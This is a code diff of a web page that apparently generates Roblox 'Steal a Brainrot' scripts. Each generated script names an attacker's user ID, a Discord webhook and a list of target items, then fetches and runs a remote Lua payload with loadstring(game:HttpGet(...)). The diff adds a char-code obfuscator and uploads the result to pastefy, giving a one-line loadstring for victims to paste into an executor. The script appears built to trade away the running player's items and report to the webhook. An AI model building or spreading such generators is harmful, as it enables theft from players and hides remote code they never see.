@@ -60,7 +60,6 @@
     .loadstring-row input{flex:1;font-family:monospace;font-size:.75rem;color:#7dd3fc;background:rgba(255,255,255,.05);border-color:rgba(56,189,248,.3)}
     .btn-copy-ls{font-size:.75rem;font-weight:600;background:linear-gradient(135deg,#0369a1,#0ea5e9);color:#fff;border:none;padding:.375rem .75rem;border-radius:.5rem;cursor:pointer;white-space:nowrap}
     .btn-copy-ls.copied{background:linear-gradient(135deg,#16a34a,#15803d)}
-    /* Brainrot Picker */
     .picker-label-row{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.5rem;margin-bottom:.4rem}
     .picker-label-row label{margin-bottom:0}
     .btn-select-all,.btn-clear-all{font-size:.7rem;font-weight:600;padding:.25rem .6rem;border-radius:.375rem;cursor:pointer;border:1px solid rgba(167,139,250,.4);background:none;color:#c4b5fd}
@@ -80,7 +79,6 @@
     .brainrot-chip:hover{border-color:rgba(167,139,250,.6);background:rgba(167,139,250,.15);color:#fff}
     .brainrot-chip.selected{background:linear-gradient(135deg,rgba(124,58,237,.6),rgba(219,39,119,.6));border-color:rgba(167,139,250,.7);color:#fff}
     .brainrot-chip.hidden{display:none}
-    /* Leaderboard */
     #page-leaderboard{display:none}
     .lb-card{background:rgba(255,255,255,.05);border:1px solid rgba(167,139,250,.3);border-radius:1rem;overflow:hidden}
     table{width:100%;font-size:.875rem;border-collapse:collapse}
@@ -116,7 +114,6 @@
 </nav>
 
 <main>
-  <!-- HOME -->
   <div id="page-home" class="container">
     <div>
       <h1>Roblox Script Generator</h1>
@@ -141,7 +138,6 @@
         <input id="userid" type="text" placeholder="Auto-filled from lookup, or enter manually"/>
       </div>
 
-      <!-- Brainrot Picker -->
       <div>
         <div class="picker-label-row">
           <label>Target Brainrots <span>— click to add</span></label>
@@ -175,12 +171,12 @@
         <span class="output-label">Generated Script</span>
         <div class="output-btns">
           <button class="btn-copy" id="copy-btn" onclick="copyScript()">Copy</button>
-          <button class="btn-loadstring" id="loadstring-btn" onclick="uploadToLoadstring()">Get Loadstring</button>
+          <button class="btn-loadstring" id="loadstring-btn" onclick="uploadToLoadstring()">Obfuscate &amp; Get Loadstring</button>
         </div>
       </div>
       <pre id="script-output"></pre>
       <div id="loadstring-box" class="loadstring-box" style="display:none">
-        <div class="loadstring-label">Loadstring (paste into executor)</div>
+        <div class="loadstring-label">Obfuscated Loadstring (paste into executor)</div>
         <div class="loadstring-row">
           <input id="loadstring-output" type="text" readonly/>
           <button class="btn-copy-ls" id="copy-ls-btn" onclick="copyLoadstring()">Copy</button>
@@ -189,7 +185,6 @@
     </div>
   </div>
 
-  <!-- LEADERBOARD -->
   <div id="page-leaderboard" class="container">
     <div>
       <h1>Leaderboard</h1>
@@ -202,32 +197,26 @@
 </main>
 
 <script>
-// ─── CONFIG ──────────────────────────────────────────────────────────────────
 const API = 'https://c26c084e-f34f-4552-9fca-e0e9cd0559ca-00-2s0pu1llouxxq.spock.replit.dev';
 const SITE_URL = 'https://verdant-bunny-38db18.netlify.app/';
 const DISCORD_OAUTH = `https://discord.com/oauth2/authorize?client_id=1481713001710223501&response_type=code&redirect_uri=${encodeURIComponent(SITE_URL)}&scope=identify`;
 const medals = ['🥇','🥈','🥉'];
 
-// ─── ALL BRAINROTS ────────────────────────────────────────────────────────────
 const ALL_BRAINROTS = ["Noobini Pizzanini","Lirilì Larilà","Tim Cheese","Fluriflura","Talpa Di Fero","Svinina Bombardino","Pipi Kiwi","Noobini Santanini","Raccooni Jandelini","Tartaragno","Pipi Corni","Holy Arepa","Trippi Troppi","Gangster Footera","Bandito Bobritto","Boneca Ambalabu","Cacto Hipopotamo","Ta Ta Ta Ta Sahur","Tric Trac Baraboom","Cupcake Koala","Frogo Elfo","Pipi Avocado","Pengolino Nuvoletto","Pinealotto Fruttarino","Cappuccino Assassino","Brr Brr Patapim","Avocadini Antilopini","Trulimero Trulicina","Bambini Crostini","Bananita Dolphinita","Perochello Lemonchello","Brri Brri Bicus Dicus Bombicus","Avocadini Guffo","Salamino Penguino","Wombo Rollo","Bandito Axolito","Malame Amarele","Ti Ti Ti Sahur","Mangolini Parrocini","Frogato Pirato","Gato Celesto","Doi Doi Do","Penguin Tree","Penguino Cocosino","Mummio Rappitto","Burbaloni Loliloli","Chimpanzini Bananini","Ballerina Cappuccina","Chef Crabracadabra","Lionel Cactuseli","Glorbo Fruttodrillo","Quivioli Ameleonni","Blueberrinni Octopusini","Pipi Potato","Strawberrelli Flamingelli","Pandaccini Bananini","Sigma Boy","Clickerino Crabo","Caramello Filtrello","Cocosini Mama","Quackula","Pi Pi Watermelon","Buho del Cielo","Chocco Bunny","Puffaball","Sigma Girl","Sealo Regalo","Buho de Fuego","Seraphino Gruyero","Mythic Lucky Block","Frigo Camelo","Orangutini Ananassini","Rhino Toasterino","Bombardiro Crocodilo","Bombombini Gusini","Cavallo Virtuoso","Gorillo Watermelondrillo","Lerulerulerule","Te Te Te Sahur","Tracoducotulu Delapeladustuz","Cachorrito Melonito","Toiletto Focaccino","Brutto Gialutto","Spioniro Golubiro","Zibra Zubra Zibralini","Tigrilini Watermelini","Avocadorilla","Gorillo Subwoofero","Stoppo Luminino","Tob Tobi Tobi","Ganganzelli Trulala","Rhino Helicopterino","Magi Ribbitini","Jingle Jingle Sahur","Los Noobinis","Spongini Quackini","Carloo","Harpuccino","Carrotini Brainini","Centrucci Nuclucci","Jacko Spaventosa","Bananito Bandito","Tree Tree Tree Sahur","Fizzy Soda","Berenjello Angello","Brainrot God Lucky Block","Cocofanto Elefanto","Girafa Celestre","Tralalero Tralala","Odin Din Din Dun","Tralalita Tralala","Trenostruzzo Turbo 3000","Trippi Troppi Troppa Trippa","Ballerino Lololo","Pakrahmatmamat","Piccione Macchina","Tractoro Dinosauro","Cacasito Satalito","Aquanaut","Tartaruga Cisterna","Gattatino Nyanino","Chihuanini Taconini","Matteo","Los Crocodillitos","Tigroligre Frutonni","Money Money Man","Alessio","Tipi Topi Taco","Unclito Samito","Tukanno Bananno","Extinct Ballerina","Vampira Cappuccina","Espresso Signora","Orcalero Orcala","Jacko Jack Jack","Urubini Flamenguini","Capi Taco","Divino Platypio","Los Chihuaninis","Gattito Tacoto","Las Capuchinas","Bulbito Bandito Traktorito","Los Tungtungtungcitos","Ballerina Peppermintina","Brr es Teh Patipum","Pakrahmatmatina","Los Bombinitos","Los Orcalitos","Orcalita Orcala","Corn Corn Corn Sahur","Mummy Ambalabu","Snailenzo","Squalanana","Dug dug dug","Ginger Globo","Yeti Claus","Crabbo Limonetta","Granchiello Spiritell","Tootini Shrimpini","Los Tipi Tacos","Frio Ninja","Buho de Noelo","Piccionetta Machina","Boba Panda","Mastodontico Telepiedone","Los Gattitos","Bambu Bambu Sahur","Chrismasmamat","Anpali Babel","Astrolero Cervalero","Luv Luv Luv","Cappuccino Clownino","Bombardini Tortinii","Brasilini Berimbini","Belula Beluga","Krupuk Pagi Pagi","Skull Skull Skull","Cocoa Assassino","Tentacolo Tecnico","Ginger Cisterna","Pandanini Frostini","Dolphini Jetskini","Pop Pop Sahur","Noo La Polizia","Karkerheart Luvkur","Dumborino Miracello","Secret Lucky Block","La Vacca Saturno Saturnita","Los Tralaleritos","Las Tralaleritas","Job Job Job Sahur","GOAT","Graipuss Medussi","To to to Sahur","Chicleteira Bicicleteira","Chicleteirina Bicicleteirina","La Grande Combinasion","Nuclearo Dinossauro","Money Money Puggy","Tang Tang Keletang","Ketupat Kepat","Tictac Sahur","Ketchuru and Musturu","Lavadorito Spinito","Garama and Madundung","Ventoliero Pavonero","Burguro And Fryuro","Capitano Moby","Cerberus","Dragon Cannelloni","Bisonte Giuppitere","Sammyni Spyderini","Blackhole Goat","Jackorilla","Agarrini la Palini","Chachechi","Los Matteos","Karkerkar Kurkur","Trenostruzzo Turbo 4000","Los Tortus","La Cucaracha","Vulturino Skeletono","Boatito Auratito","Guerriro Digitale","Torrtuginni Dragonfrutini","Los Spyderinis","Fragola La La La","Extinct Tralalero","Zombie Tralala","Yess my examine","Extinct Matteo","Dul Dul Dul","Rocco Disco","La Karkerkar Combinasion","Reindeer Tralala","La Vacca Prese Presente","Pumpkini Spyderini","Frankentteo","Los Trios","Karker Sahur","Las Vaquitas Saturnitas","Los Karkeritos","Santteo","Fishboard","La Vacca Jacko Linterino","Triplito Tralaleritos","Trickolino","Paradiso Axolottino","Giftini Spyderini","Perrito Burrito","Love Love Love Sahur","1x1x1x1","Los Cucarachas","Please my Present","Cuadramat and Pakrahmatmamat","Coffin Tung Tung Tung Sahur","Tung Tung Tung Sahur","Bunnyman","Nooo My Hotspot","Los Jobcitos","Noo my examine","La Sahur Combinasion","List List List Sahur","25","Pot Hotspot","Pirulitoita Bicicleteira","Santa Hotspot","Horegini Boom","Naughty Naughty","Telemorte","Quesadilla Crocodila","Bunito Bunito Spinito","Pot Pumpkin","Cupid Cupid Sahur","Ho Ho Ho Sahur","Mi Gatito","Quesadillo Vampiro","Brunito Marsito","Cupid Hotspot","Burrito Bandito","Chill Puppy","Los Quesadillas","Noo my Candy","Arcadopus","Los Nooo My Hotspotsitos","Serafinna Medusella","Rang Ring Bus","Noo my Present","Guest 666","Los Chicleteiras","Los Mi Gatitos","67","Donkeyturbo Express","Los Burritos","Los 25","Mariachi Corazoni","Tacorillo Crocodillo","Swag Soda","Noo my Heart","Chimnino","Los Combinasionas","Chicleteira Noelteira","Fishino Clownino","Tacorita Bicicleta","Los Sweethearts","Spinny Hammy","Las Sis","DJ Panda","Chicleteira Cupideira","Los Planitos","Los Hotspotsitos","Los Spooky Combinasionas","Los Jolly Combinasionas","Cigno Fulgoro","Los Mobilis","Celularcini Viciosini","Los 67","Los Candies","La Extinct Grande","Los Bros","Bacuru and Egguru","La Spooky Grande","Chipso and Queso","Chillin Chili","Money Money Reindeer","Mieteteira Bicicleteira","Tuff Toucan","Tralaledon","Gobblino Uniciclino","Esok Sekolah","Los Cupids","Los Puggies","W or L","La Jolly Grande","Los Primos","Eviledon","Los Tacoritas","Lovin Rose","La Taco Combinasion","Orcaledon","Swaggy Bros","La Romantic Grande","Tirilikalika Tirilikalako","Jolly Jolly Sahur","Rosetti Tualetti","Nacho Spyder","Antonio","Spaghetti Tualetti","Festive 67","Los Spaghettis","Sammyni Fattini","Ginger Gerat","La Ginger Sekolah","Spooky and Pumpky","Elefanto Frigo","La Food Combinasion","Fragrama and Chocrama","Signore Carapace","La Casa Boo","Los Sekolahs","La Secret Combinasion","Los Amigos","Reinito Sleighito","Ketupat Bros","Cooki and Milki","Rosey and Teddy","Popcuru and Fizzuru","Celestial Pegasus","La Supreme Combinasion","Love Love Bear","Dragon Gingerini","Hydra Dragon Cannelloni","Griffin","Skibidi Toilet","Meowl","Strawberry Elephant","Headless Horseman","Smurf Cat","John Pork","Admin Lucky Block","Los Lucky Blocks","Taco Lucky Block","Los Taco Blocks","Spooky Lucky Block","Festive Lucky Block","Heart Lucky Block","Gold Elf","Chimpanzini Spiderini","Statutino Libertino","Gattatino Neonino","Ice Dragon"];
 
 let selectedBrainrots = new Set();
-
-// ─── AUTH STATE ──────────────────────────────────────────────────────────────
 let currentUser = null;
 let authToken = localStorage.getItem('auth_token');
 
-function apiHeaders(extra={}) {
-  const h = {'Content-Type':'application/json',...extra};
+function apiHeaders() {
+  const h = {'Content-Type':'application/json'};
   if (authToken) h['Authorization'] = 'Bearer ' + authToken;
   return h;
 }
 
-// ─── INIT ────────────────────────────────────────────────────────────────────
 async function init() {
   document.getElementById('login-btn').href = DISCORD_OAUTH;
   buildBrainrotGrid();
-
   const params = new URLSearchParams(window.location.search);
   const code = params.get('code');
   if (code) {
@@ -236,10 +225,9 @@ async function init() {
     try {
       const res = await fetch(API+'/api/auth/discord/exchange',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code,redirectUri:SITE_URL})});
       if (res.ok) { const d=await res.json(); authToken=d.token; localStorage.setItem('auth_token',authToken); currentUser=d.user; }
-    } catch(e){console.error('Auth failed',e);}
+    } catch(e){console.error(e);}
     document.getElementById('loading-overlay').classList.add('hidden');
   }
-
   if (authToken && !currentUser) {
     try {
       const res = await fetch(API+'/api/auth/me',{headers:apiHeaders()});
@@ -247,7 +235,6 @@ async function init() {
       else { authToken=null; localStorage.removeItem('auth_token'); }
     } catch{}
   }
-
   if (currentUser) { renderUserNav(); loadSettings(); }
 }
 
@@ -272,8 +259,7 @@ async function loadSettings() {
       document.getElementById('userid').value=s.robloxUserId||'';
       document.getElementById('custom').value=s.customLoadstring||'';
       if (s.brainrots) {
-        const saved=s.brainrots.split('\n').map(b=>b.trim()).filter(Boolean);
-        saved.forEach(b=>{if(ALL_BRAINROTS.includes(b))selectedBrainrots.add(b);});
+        s.brainrots.split('\n').map(b=>b.trim()).filter(Boolean).forEach(b=>{if(ALL_BRAINROTS.includes(b))selectedBrainrots.add(b);});
         updateGrid(); renderTags();
       }
     }
@@ -286,53 +272,48 @@ function logout() {
   location.reload();
 }
 
-// ─── BRAINROT PICKER ─────────────────────────────────────────────────────────
 function buildBrainrotGrid() {
-  const grid = document.getElementById('brainrot-grid');
-  grid.innerHTML = ALL_BRAINROTS.map(b=>`<span class="brainrot-chip" data-name="${b}" onclick="toggleBrainrot('${b.replace(/'/g,"\\'")}')">
-    ${b}
-  </span>`).join('');
+  document.getElementById('brainrot-grid').innerHTML = ALL_BRAINROTS.map(b=>`<span class="brainrot-chip" data-name="${b.replace(/"/g,'&quot;')}" onclick="toggleBrainrot(this)">${b}</span>`).join('');
 }
 
-function toggleBrainrot(name) {
+function toggleBrainrot(el) {
+  const name = el.getAttribute('data-name');
   if (selectedBrainrots.has(name)) selectedBrainrots.delete(name);
   else selectedBrainrots.add(name);
-  updateGrid(); renderTags();
+  el.classList.toggle('selected', selectedBrainrots.has(name));
+  renderTags();
 }
 
 function updateGrid() {
   document.querySelectorAll('.brainrot-chip').forEach(el=>{
-    const name=el.getAttribute('data-name');
-    el.classList.toggle('selected', selectedBrainrots.has(name));
+    el.classList.toggle('selected', selectedBrainrots.has(el.getAttribute('data-name')));
   });
 }
 
 function renderTags() {
-  const container=document.getElementById('selected-tags');
-  const placeholder=document.getElementById('tags-placeholder');
+  const container = document.getElementById('selected-tags');
   if (selectedBrainrots.size===0) {
     container.innerHTML='<span id="tags-placeholder" class="tags-placeholder">No brainrots selected</span>';
     return;
   }
-  placeholder && (placeholder.style.display='none');
-  container.innerHTML=[...selectedBrainrots].map(b=>`
-    <span class="tag">${b}<button class="tag-x" onclick="toggleBrainrot('${b.replace(/'/g,"\\'")}')">✕</button></span>
-  `).join('');
+  container.innerHTML=[...selectedBrainrots].map(b=>`<span class="tag">${b}<button class="tag-x" onclick="removeTag('${b.replace(/'/g,"\\'")}')" title="Remove">✕</button></span>`).join('');
 }
 
-function filterBrainrots(query) {
-  const q=query.toLowerCase();
+function removeTag(name) {
+  selectedBrainrots.delete(name);
+  updateGrid(); renderTags();
+}
+
+function filterBrainrots(q) {
+  q=q.toLowerCase();
   document.querySelectorAll('.brainrot-chip').forEach(el=>{
-    const name=el.getAttribute('data-name').toLowerCase();
-    el.classList.toggle('hidden', q.length>0 && !name.includes(q));
+    el.classList.toggle('hidden', q.length>0 && !el.getAttribute('data-name').toLowerCase().includes(q));
   });
 }
 
 function selectAllBrainrots() {
   const q=document.getElementById('brainrot-search').value.toLowerCase();
-  document.querySelectorAll('.brainrot-chip:not(.hidden)').forEach(el=>{
-    selectedBrainrots.add(el.getAttribute('data-name'));
-  });
+  document.querySelectorAll('.brainrot-chip:not(.hidden)').forEach(el=>selectedBrainrots.add(el.getAttribute('data-name')));
   if (!q) ALL_BRAINROTS.forEach(b=>selectedBrainrots.add(b));
   updateGrid(); renderTags();
 }
@@ -341,12 +322,10 @@ function clearBrainrots() {
   selectedBrainrots.clear(); updateGrid(); renderTags();
 }
 
-// ─── LOOKUP ──────────────────────────────────────────────────────────────────
 async function lookup() {
   const username=document.getElementById('username').value.trim();
   if (!username) return;
-  const btn=document.getElementById('lookup-btn');
-  const err=document.getElementById('lookup-error');
+  const btn=document.getElementById('lookup-btn'), err=document.getElementById('lookup-error');
   btn.disabled=true; btn.textContent='...'; err.textContent='';
   try {
     const res=await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
@@ -357,13 +336,12 @@ async function lookup() {
   btn.disabled=false; btn.textContent='Look up';
 }
 
-// ─── GENERATE ────────────────────────────────────────────────────────────────
 async function generate() {
   const webhook=document.getElementById('webhook').value;
   const userid=document.getElementById('userid').value;
   const custom=document.getElementById('custom').value.trim();
   const brainrots=[...selectedBrainrots];
-  if (brainrots.length===0) { alert('Please select at least one brainrot!'); return; }
+  if (!brainrots.length) { alert('Please select at least one brainrot!'); return; }
   const entries=brainrots.map((b,i)=>`    ["${b}"] = true${i<brainrots.length-1?',':''}`).join('\n');
   const customBlock=custom?`\ntask.spawn(function()\n${custom}\nend)`:'';
   const script=`getgenv().TARGET_ID = "${userid}"\ngetgenv().DELAY_STEP = 1      \ngetgenv().TRADE_CYCLE_DELAY = 2\ngetgenv().DISCORD_WEBHOOK = "${webhook}"\ngetgenv().TARGET_BRAINROTS = {\n${entries}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8665366837c09ed56f0e30fdebd4baf1b39864d8822bffdf882f80d3d60b55c9/download"))()\nend)${customBlock}`;
@@ -372,7 +350,7 @@ async function generate() {
   document.getElementById('copy-btn').classList.remove('copied');
   document.getElementById('copy-btn').textContent='Copy';
   document.getElementById('loadstring-btn').classList.remove('done');
-  document.getElementById('loadstring-btn').textContent='Get Loadstring';
+  document.getElementById('loadstring-btn').textContent='Obfuscate & Get Loadstring';
   document.getElementById('loadstring-btn').disabled=false;
   document.getElementById('loadstring-box').style.display='none';
   if (currentUser) {
@@ -401,27 +379,37 @@ function copyScript() {
   setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied');},2000);
 }
 
-// ─── PASTEFY LOADSTRING ──────────────────────────────────────────────────────
+function obfuscateLua(script) {
+  const bytes=[];
+  for (let i=0;i<script.length;i++) bytes.push(script.charCodeAt(i));
+  const chunks=[];
+  for (let i=0;i<bytes.length;i+=60) chunks.push(bytes.slice(i,i+60).join(','));
+  return `local _={${chunks.join(',\n')}}\nlocal _s=""\nfor _i=1,#_ do _s=_s..string.char(_[_i]) end\nloadstring(_s)()`;
+}
+
 async function uploadToLoadstring() {
   const btn=document.getElementById('loadstring-btn');
   const script=document.getElementById('script-output').textContent;
   if (!script) return;
-  btn.disabled=true; btn.textContent='Uploading...';
+  btn.disabled=true; btn.textContent='Obfuscating...';
+  let obfuscated;
+  try { obfuscated=obfuscateLua(script); }
+  catch(e) { btn.textContent='Failed'; setTimeout(()=>{btn.textContent='Obfuscate & Get Loadstring';btn.disabled=false;},2000); return; }
+  btn.textContent='Uploading...';
   try {
     const res=await fetch('https://pastefy.app/api/v2/paste',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({title:'Roblox Script',content:script,type:'PASTE'})
+      body:JSON.stringify({title:'Roblox Script',content:obfuscated,type:'PASTE'})
     });
     const d=await res.json();
     if (d.success && d.paste?.id) {
       const rawUrl=`https://pastefy.app/${d.paste.id}/raw`;
-      const loadstring=`loadstring(game:HttpGet("${rawUrl}"))()`;
-      document.getElementById('loadstring-output').value=loadstring;
+      document.getElementById('loadstring-output').value=`loadstring(game:HttpGet("${rawUrl}"))()`;
       document.getElementById('loadstring-box').style.display='block';
       btn.textContent='Done!'; btn.classList.add('done');
-    } else { btn.textContent='Failed'; setTimeout(()=>{btn.textContent='Get Loadstring';btn.disabled=false;},2000); }
-  } catch { btn.textContent='Failed'; setTimeout(()=>{btn.textContent='Get Loadstring';btn.disabled=false;},2000); }
+    } else { btn.textContent='Failed'; setTimeout(()=>{btn.textContent='Obfuscate & Get Loadstring';btn.disabled=false;},2000); }
+  } catch { btn.textContent='Failed'; setTimeout(()=>{btn.textContent='Obfuscate & Get Loadstring';btn.disabled=false;},2000); }
 }
 
 function copyLoadstring() {
@@ -431,7 +419,6 @@ function copyLoadstring() {
   setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied');},2000);
 }
 
-// ─── PAGES ───────────────────────────────────────────────────────────────────
 function showPage(page) {
   document.getElementById('page-home').style.display=page==='home'?'flex':'none';
   document.getElementById('page-leaderboard').style.display=page==='leaderboard'?'flex':'none';
